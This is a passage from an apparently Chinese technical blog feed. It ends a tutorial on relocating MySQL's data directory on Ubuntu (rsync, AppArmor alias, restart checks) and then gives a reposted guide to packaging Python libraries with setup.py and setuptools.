<p>出现提示时，提供 MySQL root 密码。然后在 MySQL 提示符下，选择数据目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@datadir;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Output</span><br><span class="line">+-----------------+</span><br><span class="line">| @@datadir       |</span><br><span class="line">+-----------------+</span><br><span class="line">| /var/lib/mysql/ |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>此输出确认 MySQL 已配置为使用默认数据目录， <code>/var/lib/mysql/</code> ,因此这是我们需要移动的目录。</p>
<p>为了确保数据的完整性，在实际更改数据目录之前，我们将关闭 MySQL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl stop mysql</span><br></pre></td></tr></table></figure>

<p><code>systemctl</code> 不会显示所有服务管理命令的结果，因此，如果要确保成功，请使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl status mysql</span><br></pre></td></tr></table></figure>

<p>如果输出的最后一行告诉您服务器已停止，则可以确定它已关闭：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Output</span><br><span class="line">. . .</span><br><span class="line">Dec 15 11:42:15 ckcat-ubuntu systemd[1]: Stopped MySQL Community Server.</span><br></pre></td></tr></table></figure>

<p>现在服务器已关闭，我们将使用 <code>rsync</code> 将现有数据库目录复制到新位置。使用该 <code>-a</code> 标志保留权限和其他目录属性，同时 <code>-v</code> 提供详细的输出，以便您可以跟踪进度。</p>
<blockquote>
<p>注意：请确保目录上没有斜杠，如果使用制表符补全，可以添加斜杠。当出现斜杠时，rsync 会将目录的内容转储到安装点，而不是将其传输到包含 mysql 目录.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo rsync -av /var/lib/mysql ~/.mysqldata</span><br></pre></td></tr></table></figure>

<p>一旦 rsync 完成，用.bak 扩展名重命名当前文件夹中保存，直到我们已经证实，此举是成功的。通过重命名，我们可以避免新旧位置文件引起的混乱：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo mv /var/lib/mysql /var/lib/mysql.bak</span><br></pre></td></tr></table></figure>

<p>现在，我们准备将注意力转向配置。</p>
<h2 id="第-2-步-指向新数据位置"><a href="#第-2-步-指向新数据位置" class="headerlink" title="第 2 步-指向新数据位置"></a>第 2 步-指向新数据位置</h2><p>MySQL 有几种方法可以覆盖配置值。默认情况下， <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> 在文件中 <code>datadir</code> 设置为 <code>/var/lib/mysql</code> 。编辑此文件以反映新的数据目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br></pre></td></tr></table></figure>

<p>找到开头的行， <code>datadir=</code> 并更改其后的路径以反映新位置。</p>
<p>在我们的例子中，更新后的文件如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">. . .</span><br><span class="line">datadir=~/.mysqldata/mysql</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure>

<p>这似乎是重新启动 MySQL 的正确时机，但是在成功完成此配置之前，还需要配置一件事。</p>
<h2 id="步骤-3-—配置-AppArmor-访问控制规则"><a href="#步骤-3-—配置-AppArmor-访问控制规则" class="headerlink" title="步骤 3 —配置 AppArmor 访问控制规则"></a>步骤 3 —配置 AppArmor 访问控制规则</h2><p>我们需要告诉 AppArmor 通过在默认目录和新位置之间创建别名来让 MySQL 写入新目录。为此，请编辑 AppArmor <code>alias</code> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/apparmor.d/tunables/alias</span><br></pre></td></tr></table></figure>

<p>在文件底部，添加以下别名规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">. . .</span><br><span class="line">alias /var/lib/mysql/ -&gt; ~/.mysqldata/mysql,</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure>

<p>为了使更改生效，请重新启动 AppArmor：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart apparmor</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：如果跳过 AppArmor 配置步骤，则会遇到以下错误消息：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Output</span><br><span class="line">Job for mysql.service failed because the control process</span><br><span class="line">exited with error code. See &quot;systemctl status mysql.service&quot;</span><br><span class="line">and &quot;journalctl -xe&quot; for details.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>从 <code>systemctl</code> 和<code>journalctl</code> 两者的输出结尾判断：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Output</span><br><span class="line">Jul 18 11:03:24 ubuntu-512mb-nyc1-01 systemd[1]:</span><br><span class="line">mysql.service: Main process exited, code=exited, status=1/FAILURE</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于消息没有在 AppArmor 和数据目录之间建立显式连接，因此该错误可能需要一些时间才能弄清楚。</p>
</blockquote>
<h2 id="第-4-步-重新启动-MySQL"><a href="#第-4-步-重新启动-MySQL" class="headerlink" title="第 4 步-重新启动 MySQL"></a>第 4 步-重新启动 MySQL</h2><p>下一步是启动 MySQL ，但如果这样做，则会遇到另一个错误。这次不是发生 AppArmor 问题，而是因为该脚本 <code>mysql-systemd-start</code> 检查是否存在与两个默认路径匹配的目录 <code>-d</code> 或符号链接 <code>-L</code> 。如果找不到它们，它将失败：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">. . .</span><br><span class="line">if [ ! -d /var/lib/mysql ] &amp;&amp; [ ! -L /var/lib/mysql ]; then</span><br><span class="line"> echo &quot;MySQL data dir not found at /var/lib/mysql. Please create one.&quot;</span><br><span class="line"> exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -d /var/lib/mysql/mysql ] &amp;&amp; [ ! -L /var/lib/mysql/mysql ]; then</span><br><span class="line"> echo &quot;MySQL system database not found. Please run mysql_install_db tool.&quot;</span><br><span class="line"> exit 1</span><br><span class="line">fi</span><br><span class="line">. . .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为我们需要这些来启动服务器，所以我们将创建最小的目录结构以通过脚本的环境检查。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir /var/lib/mysql/mysql -p</span><br></pre></td></tr></table></figure>

<p>现在我们准备启动 MySQL。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start mysql</span><br><span class="line">$ sudo systemctl status mysql</span><br></pre></td></tr></table></figure>

<p>为了确保确实使用了新的数据目录，请启动 MySQL 监视器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mysql -u root -p</span><br></pre></td></tr></table></figure>

<p>再次查看数据目录的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@datadir;</span><br><span class="line"></span><br><span class="line">+-------------------------------+</span><br><span class="line">| @@datadir                     |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| /home/ckcat/.mysqldata/mysql/ |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>现在，您已经重新启动了 MySQL 并确认它正在使用新位置，请借此机会确保您的数据库可以正常运行。验证所有现有数据的完整性后，即可删除备份数据目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo rm -Rf /var/lib/mysql.bak</span><br></pre></td></tr></table></figure>

<p>最后一次重启 MySQL，以确保它能按预期运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart mysql</span><br><span class="line">$ sudo systemctl status mysql</span><br></pre></td></tr></table></figure>

<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在本教程中，我们将 MySQL 的数据目录移动到了新位置，并更新了 Ubuntu 的 AppArmor ACL 以适应该调整。尽管我们使用的是块存储设备，但无论底层技术如何，此处的说明都应适用于重新定义数据目录的位置。</p>
<p>有关管理 MySQL 数据目录的更多信息，请参见 MySQL 官方文档中的以下部分：</p>
<ul>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/data-directory.html">Mysql 数据目录</a></li>
<li><a href="https://dev.mysql.com/doc/refman/5.7/en/multiple-data-directories.html">设置多个数据目录</a></li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 库打包分发(setup.py 编写)简易指南</title>
    <url>/2019/12/31/Python-%E5%BA%93%E6%89%93%E5%8C%85%E5%88%86%E5%8F%91-setup-py-%E7%BC%96%E5%86%99-%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<blockquote>
<p>转载 <a href="http://blog.konghy.cn/2018/04/29/setup-dot-py/">http://blog.konghy.cn/2018/04/29/setup-dot-py/</a></p>
</blockquote>
<p>Python 有非常丰富的第三方库可以使用，很多开发者会向 <a href="https://pypi.org/">pypi</a> 上提交自己的 Python 包。要想向 pypi 包仓库提交自己开发的包，首先要将自己的代码打包，才能上传分发。</p>
<h1 id="distutils-简介"><a href="#distutils-简介" class="headerlink" title="distutils 简介"></a>distutils 简介</h1><p><code>distutils</code> 是标准库中负责建立 Python 第三方库的安装器，使用它能够进行 Python 模块的安装和发布。distutils 对于简单的分发很有用，但功能缺少。大部分Python用户会使用更先进的setuptools模块.</p>
<h1 id="setuptools-简介"><a href="#setuptools-简介" class="headerlink" title="setuptools 简介"></a>setuptools 简介</h1><p><code>setuptools</code> 是 distutils 增强版，不包括在标准库中。其扩展了很多功能，能够帮助开发者更好的创建和分发 Python 包。大部分 Python 用户都会使用更先进的 <a href="https://setuptools.readthedocs.io/">setuptools</a> 模块。</p>
<p>Setuptools 有一个 fork 分支是 distribute。它们共享相同的命名空间，因此如果安装了 distribute，<code>import setuptools</code> 时实际上将导入使用 distribute 创建的包。Distribute 已经合并回 setuptools。</p>
<p>还有一个大包分发工具是 distutils2 ，其试图尝试充分利用distutils，detuptools 和 distribute 并成为 Python 标准库中的标准工具。但该计划并没有达到预期的目的，且已经是一个废弃的项目。</p>
<p>因此，setuptools 是一个优秀的，可靠的 Pthon 包安装与分发工具。以下设计到包的安装与分发均针对 setuptools，并不保证 distutils 可用。</p>
<h1 id="包格式"><a href="#包格式" class="headerlink" title="包格式"></a>包格式</h1><p>Python 库打包的格式包括 Wheel 和 Egg。Egg 格式是由 setuptools 在 2004 年引入，而 Wheel 格式是由 PEP427 在 2012 年定义。使用 Wheel 和 Egg 安装都不需要重新构建和编译，其在发布之前就应该完成测试和构建。</p>
<p>Egg 和 Wheel 本质上都是一个 zip 格式包，Egg 文件使用 .egg 扩展名，Wheel 使用 .whl 扩展名。Wheel 的出现是为了替代 Egg，其现在被认为是 Python 的二进制包的标准格式。</p>
<p>以下是 Wheel 和 Egg 的主要区别：</p>
<ul>
<li>Wheel 有一个官方的 PEP427 来定义，而 Egg 没有 PEP 定义</li>
<li>Wheel 是一种分发格式，即打包格式。而 Egg 既是一种分发格式，也是一种运行时安装的格式，并且是可以被直接 import</li>
<li>Wheel 文件不会包含 .pyc 文件</li>
<li>Wheel 使用和 PEP376 兼容的 .dist-info 目录，而 Egg 使用 .egg-info 目录</li>
<li>Wheel 有着更丰富的命名规则。</li>
<li>Wheel 是有版本的。每个 Wheel 文件都包含 wheel 规范的版本和打包的实现</li>
<li>Wheel 在内部被 sysconfig path type 管理，因此转向其他格式也更容易</li>
</ul>
<p>详细描述可见：<a href="https://packaging.python.org/discussions/wheel-vs-egg/">Wheel vs Egg</a></p>
<h1 id="setup-py-文件"><a href="#setup-py-文件" class="headerlink" title="setup.py 文件"></a>setup.py 文件</h1><p>Python 库打包分发的关键在于编写 setup.py 文件。setup.py 文件编写的规则是从 setuptools 或者 distuils 模块导入 setup 函数，并传入各类参数进行调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">from setuptools import setup</span><br><span class="line"># or</span><br><span class="line"># from distutils.core import setup  </span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">        name=&#x27;demo&#x27;,     # 包名字</span><br><span class="line">        version=&#x27;1.0&#x27;,   # 包版本</span><br><span class="line">        description=&#x27;This is a test of the setup&#x27;,   # 简单描述</span><br><span class="line">        author=&#x27;huoty&#x27;,  # 作者</span><br><span class="line">        author_email=&#x27;sudohuoty@163.com&#x27;,  # 作者邮箱</span><br><span class="line">        url=&#x27;https://www.konghy.com&#x27;,      # 包的主页</span><br><span class="line">        packages=[&#x27;demo&#x27;],                 # 包</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="参数概述"><a href="#参数概述" class="headerlink" title="参数概述"></a>参数概述</h2><p>setup 函数常用的参数如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>name</td>
<td>包名称</td>
</tr>
<tr>
<td>version</td>
<td>包版本</td>
</tr>
<tr>
<td>author</td>
<td>程序的作者</td>
</tr>
<tr>
<td>author_email</td>
<td>程序的作者的邮箱地址</td>
</tr>
<tr>
<td>maintainer</td>
<td>维护者</td>
</tr>
<tr>
<td>maintainer_email</td>
<td>维护者的邮箱地址</td>
</tr>
<tr>
<td>url</td>
<td>程序的官网地址</td>
</tr>
<tr>
<td>license</td>
<td>程序的授权信息</td>
</tr>
<tr>
<td>description</td>
<td>程序的简单描述</td>
</tr>
<tr>
<td>long_description</td>
<td>程序的详细描述</td>
</tr>
<tr>
<td>platforms</td>
<td>程序适用的软件平台列表</td>
</tr>
<tr>
<td>classifiers</td>
<td>程序的所属分类列表</td>
</tr>
<tr>
<td>keywords</td>
<td>程序的关键字列表</td>
</tr>
<tr>
<td>packages</td>
<td>需要处理的包目录(通常为包含 <code>__init__.py</code> 的文件夹)</td>
</tr>
<tr>
<td>py_modules</td>
<td>需要打包的 Python 单文件列表</td>
</tr>
<tr>
<td>download_url</td>
<td>程序的下载地址</td>
</tr>
<tr>
<td>cmdclass</td>
<td>添加自定义命令</td>
</tr>
<tr>
<td>package_data</td>
<td>指定包内需要包含的数据文件</td>
</tr>
<tr>
<td>include_package_data</td>
<td>自动包含包内所有受版本控制(cvs&#x2F;svn&#x2F;git)的数据文件</td>
</tr>
<tr>
<td>exclude_package_data</td>
<td>当 include_package_data 为 True 时该选项用于排除部分文件</td>
</tr>
<tr>
<td>data_files</td>
<td>打包时需要打包的数据文件，如图片，配置文件等</td>
</tr>
<tr>
<td>ext_modules</td>
<td>指定扩展模块</td>
</tr>
<tr>
<td>scripts</td>
<td>指定可执行脚本,安装时脚本会被安装到系统 PATH 路径下</td>
</tr>
<tr>
<td>package_dir</td>
<td>指定哪些目录下的文件被映射到哪个源码包</td>
</tr>
<tr>
<td>requires</td>
<td>指定依赖的其他包</td>
</tr>
<tr>
<td>provides</td>
<td>指定可以为哪些模块提供依赖</td>
</tr>
<tr>
<td>install_requires</td>
<td>安装时需要安装的依赖包</td>
</tr>
<tr>
<td>entry_points</td>
<td>动态发现服务和插件，下面详细讲</td>
</tr>
<tr>
<td>setup_requires</td>
<td>指定运行 <code>setup.py</code> 文件本身所依赖的包</td>
</tr>
<tr>
<td>dependency_links</td>
<td>指定依赖包的下载地址</td>
</tr>
<tr>
<td>extras_require</td>
<td>当前包的高级&#x2F;额外特性需要依赖的分发包</td>
</tr>
<tr>
<td>zip_safe</td>
<td>不压缩包，而是以目录的形式安装</td>
</tr>
</tbody></table>
<p>更多参数可见：<a href="https://setuptools.readthedocs.io/en/latest/setuptools.html">https://setuptools.readthedocs.io/en/latest/setuptools.html</a></p>
<h2 id="find-packages"><a href="#find-packages" class="headerlink" title="find_packages"></a>find_packages</h2><p>对于简单工程来说，手动增加 packages 参数是容易。而对于复杂的工程来说，可能添加很多的包，这是手动添加就变得麻烦。Setuptools 模块提供了一个 <code>find_packages</code> 函数,它默认在与 <code>setup.py</code> 文件同一目录下搜索各个含有 <code>__init__.py</code> 的目录做为要添加的包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find_packages(where=&#x27;.&#x27;, exclude=(), include=(&#x27;*&#x27;,))</span><br></pre></td></tr></table></figure>
<p><code>find_packages</code> 函数的第一个参数用于指定在哪个目录下搜索包，参数 <strong>exclude</strong> 用于指定排除哪些包，参数 <strong>include</strong> 指出要包含的包。</p>
<p>默认默认情况下 <code>setup.py</code> 文件只在其所在的目录下搜索包。如果不用 <code>find_packages</code> ，想要找到其他目录下的包，也可以设置 <strong>package_dir</strong> 参数，其指定哪些目录下的文件被映射到哪个源码包，如: <code>package_dir=&#123;&#39;&#39;: &#39;src&#39;&#125;</code> 表示 “root package” 中的模块都在 src 目录中。</p>
<h2 id="包含数据文件"><a href="#包含数据文件" class="headerlink" title="包含数据文件"></a>包含数据文件</h2><ul>
<li>package_data:</li>
</ul>
<p>该参数是一个从包名称到 glob 模式列表的字典。如果数据文件包含在包的子目录中，则 glob 可以包括子目录名称。其格式一般为 <code>&#123;&#39;package_name&#39;: [&#39;files&#39;]&#125;</code> ，比如： <code>package_data=&#123;&#39;mypkg&#39;: [&#39;data/*.dat&#39;],&#125;</code> 。</p>
<ul>
<li>include_package_data:</li>
</ul>
<p>该参数被设置为 True 时自动添加包中受版本控制的数据文件，可替代 package_data，同时， <code>exclude_package_data</code> 可以排除某些文件。注意当需要加入没有被版本控制的文件时，还是仍然需要使用 package_data 参数才行。</p>
<ul>
<li>data_files:</li>
</ul>
<p>该参数通常用于包含不在包内的数据文件，即包的外部文件，如：配置文件，消息目录，数据文件。其指定了一系列二元组，即(目的安装目录，源文件) ，表示哪些文件被安装到哪些目录中。如果目录名是相对路径，则相对于安装前缀进行解释。</p>
<ul>
<li>manifest template:</li>
</ul>
<p><code>manifest template</code> 即编写 <code>MANIFEST.in</code> 文件，文件内容就是需要包含在分发包中的文件。一个 <code>MANIFEST.in</code> 文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include *.txt</span><br><span class="line">recursive-include examples *.txt *.py</span><br><span class="line">prune examples/sample?/build</span><br></pre></td></tr></table></figure>
<p><code>MANIFEST.in</code> 文件的编写规则可参考：<a href="https://docs.python.org/3.6/distutils/sourcedist.html">https://docs.python.org/3.6/distutils/sourcedist.html</a></p>
<h2 id="生成脚本"><a href="#生成脚本" class="headerlink" title="生成脚本"></a>生成脚本</h2><p>有两个参数 <code>scripts</code> 参数或 <code>console_scripts</code> 可用于生成脚本。</p>
<p><code>entry_points</code> 参数用来支持自动生成脚本，其值应该为是一个字典，从 entry_point 组名映射到一个表示 entry_point 的字符串或字符串列表，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setup(</span><br><span class="line">    # other arguments here...</span><br><span class="line">    entry_points=&#123;</span><br><span class="line">        &#x27;console_scripts&#x27;: [</span><br><span class="line">            &#x27;foo=foo.entry:main&#x27;,</span><br><span class="line">            &#x27;bar=foo.entry:main&#x27;,</span><br><span class="line">        ],    </span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>scripts 参数是一个 list，安装包时在该参数中列出的文件会被安装到系统 PATH 路径下。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scripts=[&#x27;bin/foo.sh&#x27;, &#x27;bar.py&#x27;]</span><br></pre></td></tr></table></figure>
<p>用如下方法可以将脚本重命名，例如去掉脚本文件的扩展名(.py、.sh):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from setuptools.command.install_scripts import install_scripts</span><br><span class="line"></span><br><span class="line">class InstallScripts(install_scripts):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        setuptools.command.install_scripts.install_scripts.run(self)</span><br><span class="line"></span><br><span class="line">        # Rename some script files</span><br><span class="line">        for script in self.get_outputs():</span><br><span class="line">            if basename.endswith(&quot;.py&quot;) or basename.endswith(&quot;.sh&quot;):</span><br><span class="line">                dest = script[:-3]</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">            print(&quot;moving %s to %s&quot; % (script, dest))</span><br><span class="line">            shutil.move(script, dest)</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    # other arguments here...</span><br><span class="line">    cmdclass=&#123;</span><br><span class="line">        &quot;install_scripts&quot;: InstallScripts</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>其中，cmdclass 参数表示自定制命令，后文详述。</p>
<h2 id="ext-modules"><a href="#ext-modules" class="headerlink" title="ext_modules"></a>ext_modules</h2><p><code>ext_modules</code> 参数用于构建 C 和 C++ 扩展扩展包。其是 Extension 实例的列表，每一个 Extension 实例描述了一个独立的扩展模块，扩展模块可以设置扩展包名，头文件、源文件、链接库及其路径、宏定义和编辑参数等。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setup(</span><br><span class="line">    # other arguments here...</span><br><span class="line">    ext_modules=[</span><br><span class="line">        Extension(&#x27;foo&#x27;,</span><br><span class="line">                  glob(path.join(here, &#x27;src&#x27;, &#x27;*.c&#x27;)),</span><br><span class="line">                  libraries = [ &#x27;rt&#x27; ],</span><br><span class="line">                  include_dirs=[numpy.get_include()])</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>详细了解可参考：<a href="https://docs.python.org/3.6/distutils/setupscript.html#preprocessor-options">https://docs.python.org/3.6/distutils/setupscript.html#preprocessor-options</a></p>
<h2 id="zip-safe"><a href="#zip-safe" class="headerlink" title="zip_safe"></a>zip_safe</h2><p>zip_safe 参数决定包是否作为一个 zip 压缩后的 egg 文件安装，还是作为一个以 .egg 结尾的目录安装。因为有些工具不支持 zip 压缩文件，而且压缩后的包也不方便调试，所以建议将其设为 False，即 <code>zip_safe=False</code> 。</p>
<h2 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h2><p><code>Setup.py</code> 文件有很多内置的的命令，可以使用 &#96;&#96;python setup.py –help-commands<code>查看。如果想要定制自己需要的命令，可以添加 cmdclass 参数，其值为一个 dict。实现自定义命名需要继承</code>setuptools.Command<code>或者</code>distutils.core.Command&#96; 并重写 run 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from setuptools import setup, Command</span><br><span class="line"></span><br><span class="line">class InstallCommand(Command):</span><br><span class="line">    description = &quot;Installs the foo.&quot;</span><br><span class="line">    user_options = [</span><br><span class="line">        (&#x27;foo=&#x27;, None, &#x27;Specify the foo to bar.&#x27;),</span><br><span class="line">    ]</span><br><span class="line">    def initialize_options(self):</span><br><span class="line">        self.foo = None</span><br><span class="line">    def finalize_options(self):</span><br><span class="line">        assert self.foo in (None, &#x27;myFoo&#x27;, &#x27;myFoo2&#x27;), &#x27;Invalid foo!&#x27;</span><br><span class="line">    def run(self):</span><br><span class="line">        install_all_the_things()</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    ...,</span><br><span class="line">    cmdclass=&#123;</span><br><span class="line">        &#x27;install&#x27;: InstallCommand,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h2><p>如果包依赖其他的包，可以指定 install_requires 参数，其值为一个 list，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">install_requires=[</span><br><span class="line">    &#x27;requests&gt;=1.0&#x27;,</span><br><span class="line">    &#x27;flask&gt;=1.0&#x27;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>指定该参数后，在安装包时会自定从 pypi 仓库中下载指定的依赖包安装。</p>
<p>此外，还支持从指定链接下载依赖，即指定 dependency_links 参数，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dependency_links = [</span><br><span class="line">    &quot;http://packages.example.com/snapshots/foo-1.0.tar.gz&quot;,</span><br><span class="line">    &quot;http://example2.com/p/bar-1.0.tar.gz&quot;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="分类信息"><a href="#分类信息" class="headerlink" title="分类信息"></a>分类信息</h2><p>classifiers 参数说明包的分类信息。所有支持的分类列表见：<a href="https://pypi.org/pypi?:action=list_classifiers">https://pypi.org/pypi?%3Aaction=list_classifiers</a></p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">classifiers = [</span><br><span class="line">    # 发展时期,常见的如下</span><br><span class="line">    #   3 - Alpha</span><br><span class="line">    #   4 - Beta</span><br><span class="line">    #   5 - Production/Stable</span><br><span class="line">    &#x27;Development Status :: 3 - Alpha&#x27;,</span><br><span class="line"></span><br><span class="line">    # 开发的目标用户</span><br><span class="line">    &#x27;Intended Audience :: Developers&#x27;,</span><br><span class="line"></span><br><span class="line">    # 属于什么类型</span><br><span class="line">    &#x27;Topic :: Software Development :: Build Tools&#x27;,</span><br><span class="line"></span><br><span class="line">    # 许可证信息</span><br><span class="line">    &#x27;License :: OSI Approved :: MIT License&#x27;,</span><br><span class="line"></span><br><span class="line">    # 目标 Python 版本</span><br><span class="line">    &#x27;Programming Language :: Python :: 2&#x27;,</span><br><span class="line">    &#x27;Programming Language :: Python :: 2.7&#x27;,</span><br><span class="line">    &#x27;Programming Language :: Python :: 3&#x27;,</span><br><span class="line">    &#x27;Programming Language :: Python :: 3.3&#x27;,</span><br><span class="line">    &#x27;Programming Language :: Python :: 3.4&#x27;,</span><br><span class="line">    &#x27;Programming Language :: Python :: 3.5&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="setup-py-命令"><a href="#setup-py-命令" class="headerlink" title="setup.py 命令"></a>setup.py 命令</h2><p><code>setup.py</code> 文件有很多内置命令可供使用，查看所有支持的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python setup.py --help-commands</span><br></pre></td></tr></table></figure>
<p>此处列举一些常用命令：</p>
<ul>
<li>build:</li>
</ul>
<p>构建安装时所需的所有内容</p>
<ul>
<li>sdist:</li>
</ul>
<p>构建源码分发包，在 Windows 下为 zip 格式，Linux 下为 tag.gz 格式 。执行 sdist 命令时，默认会被打包的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所有 py_modules 或 packages 指定的源码文件</span><br><span class="line">所有 ext_modules 指定的文件</span><br><span class="line">所有 package_data 或 data_files 指定的文件</span><br><span class="line">所有 scripts 指定的脚本文件</span><br><span class="line">README、README.txt、setup.py 和 setup.cfg文件</span><br></pre></td></tr></table></figure>
<p>该命令构建的包主要用于发布，例如上传到 pypi 上。</p>
<ul>
<li>bdist:</li>
</ul>
<p>构建一个二进制的分发包。</p>
<ul>
<li>bdist_egg:</li>
</ul>
<p>构建一个 egg 分发包，经常用来替代基于 bdist 生成的模式</p>
<ul>
<li>install:</li>
</ul>
<p>安装包到系统环境中。</p>
<ul>
<li>develop:</li>
</ul>
<p>以开发方式安装包，该命名不会真正的安装包，而是在系统环境中创建一个软链接指向包实际所在目录。这边在修改包之后不用再安装就能生效，便于调试。</p>
<ul>
<li>register、upload:</li>
</ul>
<p>用于包的上传发布，后文详述。</p>
<h2 id="setup-cfg-文件"><a href="#setup-cfg-文件" class="headerlink" title="setup.cfg 文件"></a>setup.cfg 文件</h2><p><code>setup.cfg</code> 文件用于提供 setup.py 的默认参数，详细的书写规则可参考：<a href="https://docs.python.org/3/distutils/configfile.html">https://docs.python.org/3/distutils/configfile.html</a></p>
<h2 id="版本命名"><a href="#版本命名" class="headerlink" title="版本命名"></a>版本命名</h2><p>包版本的命名格式应为如下形式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N.N[.N]+[&#123;a|b|c|rc&#125;N[.N]+][.postN][.devN]</span><br></pre></td></tr></table></figure>
<p>从左向右做一个简单的解释：</p>
<ul>
<li><code>N.N</code>: 必须的部分，两个 “N” 分别代表了主版本和副版本号</li>
<li><code>[.N]</code>: 次要版本号，可以有零或多个</li>
<li><code>&#123;a|b|c|rc&#125;</code>: 阶段代号，可选, a, b, c, rc 分别代表 alpha, beta, candidate 和 release candidate</li>
<li><code>N[.N]</code>: 阶段版本号，如果提供，则至少有一位主版本号，后面可以加无限多位的副版本号</li>
<li><code>.postN</code>: 发行后更新版本号，可选</li>
<li><code>.devN</code>: 开发期间的发行版本号，可选</li>
</ul>
<h2 id="easy-install-与-pip"><a href="#easy-install-与-pip" class="headerlink" title="easy_install 与 pip"></a>easy_install 与 pip</h2><p>easy_insall 是 setuptool 包提供的第三方包安装工具，而 pip 是 Python 中一个功能完备的包管理工具，是 easy_install 的改进版，提供更好的提示信息，删除包等功能。</p>
<p>pip 相对于 easy_install 进行了以下几个方面的改进:</p>
<ul>
<li>所有的包是在安装之前就下载了，所以不可能出现只安装了一部分的情况</li>
<li>在终端上的输出更加友好</li>
<li>对于动作的原因进行持续的跟踪。例如，如果一个包正在安装，那么 pip 就会跟踪为什么这个包会被安装</li>
<li>错误信息会非常有用</li>
<li>代码简洁精悍可以很好的编程</li>
<li>不必作为 egg 存档，能扁平化安装(仍然保存 egg 元数据)</li>
<li>原生的支持其他版本控制系统(Git, Mercurial and Bazaar)</li>
<li>加入卸载包功能</li>
<li>可以简单的定义修改一系列的安装依赖，还可以可靠的赋值一系列依赖包</li>
</ul>
